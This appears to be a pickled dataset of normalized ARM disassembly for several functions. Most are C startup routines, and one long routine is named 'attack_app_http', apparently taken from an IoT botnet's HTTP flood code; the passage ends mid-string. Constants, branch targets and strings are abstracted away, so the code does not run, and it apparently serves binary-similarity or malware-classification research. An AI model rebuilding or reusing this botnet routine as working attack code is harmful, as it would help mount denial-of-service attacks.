(lp0
(S'_init'
p1
S'"MOV~R12,SP\nSTMFD~SP!,{R4-R12,LR,PC}\nSUB~R11,R12,0\nBL~FOO\nBL~FOO\nLDMDB~R11,{R4-R11,SP,PC}"'
p2
L24L
tp3
a(S'__do_global_dtors_aux'
p4
S'"STMFD~SP!,{R4,R5,LR}\nLDR~R5,<STR>\nLDRB~R3,[R5]\nCMP~R3,0\nLDMNEFD~SP!,{R4,R5,PC}\nLDR~R4,<STR>\nLDR~R3,[R4]\nLDR~R2,[R3]\nCMP~R2,0\nBEQ~FOO\nADD~R3,R3,0\nSTR~R3,[R4]\nMOV~LR,PC\nMOV~PC,R2\nLDR~R3,[R4]\nLDR~R2,[R3]\nCMP~R2,0\nBNE~FOO\nLDR~R3,<STR>\nCMP~R3,0\nLDRNE~R0,<STR>\nMOVNE~LR,PC\nMOVNE~PC,R3\nMOV~R3,0\nSTRB~R3,[R5]\nLDMFD~SP!,{R4,R5,PC}"'
p5
L104L
tp6
a(S'call___do_global_dtors_aux'
p7
S'"STR~LR,[SP,-0]\nLDR~PC,[SP]"'
p8
L8L
tp9
a(S'frame_dummy'
p10
S'"LDR~R3,<STR>\nCMP~R3,0\nSTR~LR,[SP,-0]\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOVNE~LR,PC\nMOVNE~PC,R3\nLDR~R0,<STR>\nLDR~R3,[R0]\nCMP~R3,0\nLDR~R3,<STR>\nLDREQ~PC,[SP]\nCMP~R3,0\nLDREQ~PC,[SP]\nMOV~LR,PC\nMOV~PC,R3\nLDR~PC,[SP]"'
p11
L68L
tp12
a(S'call_frame_dummy'
p13
S'"STR~LR,[SP,-0]\nLDR~PC,[SP]"'
p14
L8L
tp15
a(S'_start'
p16
S'"MOV~R11,0\nMOV~LR,0\nLDR~R1,[SP]\nMOV~R2,SP\nSTR~R2,[SP,-0]\nSTR~R0,[SP,-0]\nLDR~R12,<STR>\nSTR~R12,[SP,-0]\nLDR~R0,<STR>\nLDR~R3,<STR>\nB~FOO"'
p17
L44L
tp18
a(S'attack_app_http'
p19
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R0,R4\nMOV~R1,R3\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTR~R0,[SP,0]\nADD~R0,SP,0\nADD~R0,R0,0\nSUB~R0,R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nCMP~R9,0\nCMPNE~R11,0\nMOVNE~R4,0\nMOVEQ~R4,0\nBEQ~FOO\nMOV~R0,R9\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,R11\nBL~FOO\nCMP~R0,0\nBGT~FOO\nLDR~R0,[SP,0]\nBL~FOO\nCMP~R0,0\nADDLE~R0,SP,0\nSTRLE~R4,[R0,0]\nBLE~FOO\nB~FOO\nLDR~R3,[SP,0]\nLDRB~R1,[R3,R2]\nSUB~R3,R1,0\nCMP~R3,0\nSUBLS~R3,R1,0\nLDRLS~R12,[SP,0]\nSTRLSB~R3,[R12,R2]\nADD~R0,SP,0\nLDR~R3,[R0,0]\nADD~R3,R3,0\nSTR~R3,[R0,0]\nLDR~R0,[SP,0]\nBL~FOO\nADD~R1,SP,0\nLDR~R2,[R1,0]\nCMP~R0,R2\nBGT~FOO\nCMP~R6,0\nMOVGE~R6,0\nSTR~R6,[SP,0]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nMOV~R5,R0\nSTR~R0,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nBLE~FOO\nMOV~R8,0\nMOV~R7,R5\nMOV~R3,0\nSTRB~R3,[R5,0]\nSUB~R3,R3,0\nSTR~R3,[R5]\nMOV~R0,R8\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R3,R0,LSL0\nSUB~R3,R3,R0,LSL0\nLDR~R12,[SP,0]\nADD~R6,R3,R12\nMOV~R10,R5\nLDR~R3,[R6,0]\nSTR~R3,[R5,0]\nADD~R0,R5,0\nSTR~R0,[SP,0]\nMOV~R1,R9\nBL~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[SP,0]\nBL~FOO\nMOV~R2,R0\nMOV~R0,0\nADD~R0,R5,R0\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R3,0\nSTRB~R3,[R5,0]\nADD~R0,R7,0\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R0,0\nADD~R0,R7,R0\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R0,0\nADD~R0,R7,R0\nMOV~R1,R11\nBL~FOO\nLDRB~R3,[R6,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R6,0]\nBL~FOO\nAND~R3,R4,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R4,LSR0\nAND~R2,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R2,LSL0\nORR~R3,R3,R4\nLDRB~R2,[R6,0]\nADD~R3,R3,R0,LSRR2\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~R2,R2,R3\nSTR~R2,[R10,0]\nBL~FOO\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nLDRLS~PC,[PC,R0,LSL0]\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[SP,0]\nMOV~R1,R9\nBL~FOO\nADD~R8,R8,0\nMOV~R3,0\nADD~R5,R5,R3\nLDR~R1,[SP,0]\nCMP~R1,R8\nBNE~FOO\nMOV~R0,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R3,0\nADD~R2,SP,0\nADD~R2,R2,0\nSUB~R2,R2,0\nMOV~R1,R3\nSTR~R1,[R3,R2]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nMOV~R3,R1\nADD~R2,SP,0\nADD~R2,R2,0\nSUB~R2,R2,0\nMOV~R0,0\nSTR~R0,[R3,R2]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nLDR~R2,[SP,0]\nCMP~R2,0\nBLE~FOO\nADD~R3,R3,0\nADD~R3,R3,0\nLDR~R12,[SP,0]\nADD~R6,R12,R3\nSTR~R0,[SP,0]\nSTR~R0,[SP,0]\nMOV~R0,0\nSTR~R0,[SP,0]\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R8,R1,R0\nADD~R2,R1,R0\nSTR~R2,[SP,0]\nADD~R3,R1,R0\nSTR~R3,[SP,0]\nSUB~R7,R6,0\nSUB~R7,R7,0\nMOV~R11,R6\nLDRB~R3,[R6,-0]\nCMP~R3,0\nBNE~FOO\nLDR~R3,[R6,-0]\nCMP~R3,0\nMOVNE~R3,0\nSTRNEB~R3,[R6,-0]\nMOVEQ~R12,0\nSTREQB~R12,[R6,-0]\nBEQ~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nLDR~R1,[SP,0]\nADD~R3,R0,R1\nMOV~R2,0\nSTR~R2,[R0,R1]\nADD~R3,R3,0\nSTR~R2,[R3]\nSTR~R2,[R3]\nSTR~R2,[R3]\nMOV~R5,R6\nLDR~R0,[R6,-0]\nCMN~R0,0\nBLNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R4,R0\nSTR~R0,[R5,-0]\nCMN~R0,0\nBEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nLDR~R0,[R5,-0]\nMOV~R2,0\nSTR~R2,[SP]\nMOV~R1,0\nADD~R2,R2,0\nBL~FOO\nMOV~R1,0\nADD~R3,SP,0\nADD~R3,R3,0\nLDR~R12,[SP,0]\nSTRB~R1,[R3,R12]\nMOV~R0,0\nSTRB~R0,[R8,0]\nLDR~R3,[R6,-0]\nSTR~R3,[R8,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R8,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R8,0]\nLDR~R3,[SP,0]\nSTR~R3,[R5,-0]\nSTRB~R1,[R11,-0]\nLDR~R0,[R5,-0]\nMOV~R1,R8\nMOV~R2,0\nBL~FOO\nLDR~LR,[R5,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R1,R1,R12\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R0,[SP,0]\nCMP~LR,R0\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~R3,[R6,-0]\nLDR~R2,[SP,0]\nRSB~R3,R3,R2\nCMP~R3,0\nBLS~FOO\nMOV~R3,0\nSTRB~R3,[R6,-0]\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nB~FOO\nLDR~LR,[R6,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R1,R1,R12\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R0,[SP,0]\nCMP~LR,R0\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nMOV~R10,R6\nMOV~R3,0\nSTR~R3,[R6]\nMOV~R9,0\nSTR~R9,[R6,-0]\nMOV~R0,0\nADD~R0,R7,R0\nMOV~R1,0\nBL~FOO\nSTR~R9,[R6,0]\nLDR~R5,[SP,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R3,0\nADD~R3,R7,R3\nSTR~R3,[SP,0]\nADD~R0,R5,R0\nMOV~R1,R3\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nADD~R1,R7,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nADD~R1,R7,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nMOV~R1,0\nADD~R1,R7,R1\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R1,[SP,0]\nCMP~R1,R9\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R0,[SP,0]\nBL~FOO\nMOV~R4,R0\nMOV~R0,R5\nBL~FOO\nADD~R2,R5,R0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R3,[R10,0]\nCMP~R3,0\nBLE~FOO\nMOV~R0,R8\nBL~FOO\nADD~R0,R8,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R3,0\nADD~R2,SP,0\nSTR~R3,[R2,0]\nLDR~R3,[R10,0]\nCMP~R3,0\nBLE~FOO\nADD~R4,SP,0\nSUB~R4,R4,0\nMOV~R0,R4\nBL~FOO\nADD~R12,SP,0\nLDR~R1,[R12,0]\nMOV~R1,R1,LSL0\nADD~R1,R1,0\nADD~R0,R4,R0\nADD~R1,R7,R1\nBL~FOO\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nLDR~R1,<STR>\nBL~FOO\nADD~R0,SP,0\nLDR~R3,[R0,0]\nADD~R3,R3,0\nSTR~R3,[R0,0]\nLDR~R2,[R10,0]\nCMP~R2,R3\nBGT~FOO\nMOV~R0,R8\nBL~FOO\nADD~R0,R8,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R4,[SP,0]\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R1,[SP,0]\nCMP~R1,0\nBEQ~FOO\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nLDR~R1,[SP,0]\nBL~FOO\nADD~R4,R7,0\nLDR~R0,[SP,0]\nMOV~R1,R4\nBL~FOO\nCMP~R0,0\nLDREQ~R0,[SP,0]\nMOVEQ~R1,R4\nBLEQ~FOO\nLDR~R4,[R10,-0]\nMOV~R0,R8\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nMOV~R1,R8\nMOV~R3,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R2,[R10,-0]\nMOV~R3,0\nSTRB~R3,[R11,-0]\nLDR~LR,[R10,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R1,R1,R3\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R12,[SP,0]\nCMP~LR,R12\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~LR,[R6,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R1,R2\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R3,[SP,0]\nCMP~LR,R3\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~LR,[R6,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R1,R1,R12\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R0,[SP,0]\nCMP~LR,R0\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~LR,[R6,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R1,R2\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R3,[SP,0]\nCMP~LR,R3\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nMOV~R12,0\nSTRB~R12,[R6,-0]\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nB~FOO\nMOV~R0,0\nSTRB~R0,[R6,-0]\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nLDR~R1,[SP,0]\nADD~R1,R1,0\nSTR~R1,[SP,0]\nMOV~R3,0\nADD~R6,R6,R3\nLDR~R2,[SP,0]\nCMP~R2,R1\nBNE~FOO\nLDR~R3,[SP,0]\nCMP~R3,0\nBEQ~FOO\nMOV~R2,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R1,R12,R2\nMOV~R5,0\nSTR~R5,[R1,0]\nMOV~R3,0\nSTR~R3,[R12,R2]\nSTR~R1,[SP]\nLDR~R0,[SP,0]\nADD~R1,SP,0\nADD~R1,R1,0\nSUB~R1,R1,0\nADD~R2,SP,0\nADD~R2,R2,0\nSUB~R2,R2,0\nMOV~R3,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,R5\nBL~FOO\nSTR~R0,[SP,0]\nCMP~R4,R5\nBLE~FOO\nLDR~R0,[SP,0]\nADD~R0,R0,0\nSTR~R0,[SP,0]\nSTR~R5,[SP,0]\nMOV~R1,0\nSTR~R1,[SP,0]\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R2,R2,R1\nSTR~R2,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R12,R12,R3\nSTR~R12,[SP,0]\nMOV~R0,0\nSTR~R0,[SP,0]\nADD~R1,R1,0\nSUB~R1,R1,0\nSTR~R1,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nADD~R3,R3,0\nSUB~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R12,0\nSTR~R12,[SP,0]\nLDR~R0,[SP,0]\nSUB~R9,R0,0\nMOV~R6,R0\nLDR~R0,[R0,-0]\nCMN~R0,0\nBEQ~FOO\nMOV~R2,0\nMOV~R3,R0,LSR0\nMOV~R3,R3,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R3,R1\nAND~R1,R0,0\nLDR~R3,[R3,R2]\nMOV~R3,R3,LSRR1\nTST~R3,0\nBEQ~FOO\nMOV~R2,0\nSUB~R4,R2,0\nMOV~R12,0\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R12,[R3,R4]\nMOV~R5,0\nLDR~R1,[SP,0]\nSTR~R5,[R3,R1]\nLDR~R2,[SP,0]\nSTR~R2,[SP]\nMOV~R1,0\nMOV~R2,R5\nADD~R3,R3,R4\nBL~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nLDR~R3,[R12,R4]\nORRS~R3,R0,R3\nLDREQ~R0,[SP,0]\nSTREQB~R5,[R0,-0]\nBEQ~FOO\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nMOV~R2,0\nLDR~R1,[SP,0]\nSTRB~R2,[R1,-0]\nB~FOO\nLDR~R1,[R6,-0]\nMOV~R2,0\nMOV~R3,R1,LSR0\nMOV~R3,R3,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R3,R12\nAND~R1,R1,0\nLDR~R3,[R3,R2]\nMOV~R3,R3,LSRR1\nTST~R3,0\nBEQ~FOO\nLDR~R0,[SP,0]\nSTR~R0,[SP,0]\nLDRB~R3,[R0,-0]\nCMP~R3,0\nBNE~FOO\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nLDR~R0,[R6,-0]\nLDR~R1,[SP,0]\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nSTR~R0,[SP,0]\nBGT~FOO\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nMOV~R2,0\nLDR~R1,[SP,0]\nSTRB~R2,[R1,-0]\nB~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nLDR~R12,[SP,0]\nADD~R0,R3,R12\nLDR~R1,[SP,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nCMP~R0,0\nBLT~FOO\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R0,R1,R0\nMOV~R3,0\nLDR~R2,[SP,0]\nSTRB~R3,[R0,R2]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R6,-0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nADD~R12,SP,0\nADD~R12,R12,0\nLDR~R1,[SP,0]\nADD~R0,R12,R1\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R6,-0]\nMOV~R4,0\nSTR~R4,[R6]\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nLDR~R7,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R5,R3,R7\nMOV~R0,R5\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nMOV~R0,R5\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R0\nLDRB~R3,[R3,R7]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R0,[SP,0]\nADD~R5,R0,R4\nMOV~R0,R5\nLDR~R2,[SP,0]\nRSB~R1,R4,R2\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R0,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nMOV~R2,0\nSTRB~R2,[R3,R0]\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R5\nMOV~R1,R4\nBL~FOO\nCMP~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R6]\nMOV~R4,0\nSTR~R4,[R6,0]\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nLDR~R7,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R5,R3,R7\nMOV~R0,R5\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nMOV~R0,R5\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R0\nLDRB~R3,[R3,R7]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R0,[SP,0]\nADD~R5,R0,R4\nMOV~R0,R5\nLDR~R2,[SP,0]\nRSB~R1,R4,R2\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R0,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nMOV~R2,0\nSTRB~R2,[R3,R0]\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R5\nMOV~R1,R4\nBL~FOO\nCMP~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R6,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nLDR~R5,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R4,R3,R5\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVEQ~R3,0\nSTREQ~R3,[R6,0]\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R0\nLDRB~R3,[R3,R5]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R0,[SP,0]\nADD~R5,R0,R4\nMOV~R0,R5\nLDR~R2,[SP,0]\nRSB~R1,R4,R2\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R0,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nMOV~R2,0\nSTRB~R2,[R3,R0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTR~R0,[R6,0]\nMOV~R12,0\nSTR~R12,[SP,0]\nB~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R10,R0\nADD~R0,SP,0\nADD~R0,R0,0\nLDR~R1,[SP,0]\nADD~R3,R0,R1\nLDR~R2,[SP,0]\nADD~R3,R3,R2\nLDRB~R3,[R3,R10]\nCMP~R3,0\nADDEQ~R10,R10,0\nADD~R8,R4,R10\nLDR~R12,[SP,0]\nLDR~R0,[SP,0]\nRSB~R3,R0,R12\nRSB~R7,R10,R3\nMOV~R0,R8\nMOV~R1,R7\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBEQ~FOO\nLDR~R1,[SP,0]\nADD~R11,R1,R10\nLDR~R2,[SP,0]\nADD~R5,R2,R11\nCMP~R0,0\nSUBGT~R4,R0,0\nMOV~R0,R8\nMOV~R1,R7\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nMOV~R0,R8\nMOV~R1,R7\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nSUB~R4,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R0,[SP,0]\nADD~R3,R3,R0\nMOV~R1,0\nSTRB~R1,[R3,R11]\nMOV~R3,0\nADD~R2,SP,0\nSTR~R3,[R2,0]\nB~FOO\nLDRB~R3,[R5,R4]\nCMP~R3,0\nBEQ~FOO\nADD~R3,R4,0\nADD~R12,SP,0\nSTR~R3